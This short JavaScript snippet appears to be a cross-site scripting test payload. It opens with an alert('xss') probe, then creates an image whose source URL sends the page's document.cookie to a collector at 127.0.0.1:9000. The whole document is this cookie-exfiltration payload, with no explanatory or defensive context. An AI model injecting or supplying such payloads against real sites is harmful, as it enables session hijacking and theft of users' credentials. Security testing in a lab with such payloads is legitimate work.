
alert('xss');
var img = new Image();
img.src="http://127.0.0.1:9000/" + document.cookie ;
